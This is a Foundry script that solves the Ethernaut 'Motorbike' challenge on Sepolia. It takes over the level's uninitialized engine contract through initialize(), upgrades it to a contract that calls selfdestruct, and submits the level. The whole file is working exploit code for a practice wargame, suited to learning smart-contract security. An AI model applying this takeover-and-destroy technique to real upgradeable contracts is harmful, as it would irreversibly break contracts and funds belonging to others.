pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface Ethernaut{
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address payable _instance) external;
    function statistics() external view returns (address);
}

interface Motorbike{
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Destroyer {
    function killit() public{
        selfdestruct(payable(msg.sender));
    }
}

contract Attacker {
    function attack(address naut, address level, address engine, address instance) public {
        Destroyer destroyer = new Destroyer();
        Ethernaut(naut).createLevelInstance(level);
        Motorbike(engine).initialize();
        Motorbike(engine).upgradeToAndCall(address(destroyer), abi.encodeWithSignature("killit()"));
    }

    function submit(address naut, address instance) public {
        Ethernaut(naut).submitLevelInstance(payable(instance));
    }
}

contract POC is Script {
    function setUp() public {
        vm.createSelectFork("sepolia");
    }


    function run() external{
        vm.startBroadcast();
        address naut = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
        address level = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;

        address engine = 0xE391f8B42aCE7EB97925D68A9Fa737dDF09E6DDD; // level + nonce
        address instance = 0xF31A6e81Db0EdA9beb0e08A221416FEB279B8FBe;

        Attacker attacker =  new Attacker();
        attacker.attack(naut, level, engine, instance);

        // this has to be in another transaction, because the code deletion by selfdestrut is only done at the end of a transacton
        attacker.submit(naut, instance);

        vm.stopBroadcast();
    }
}
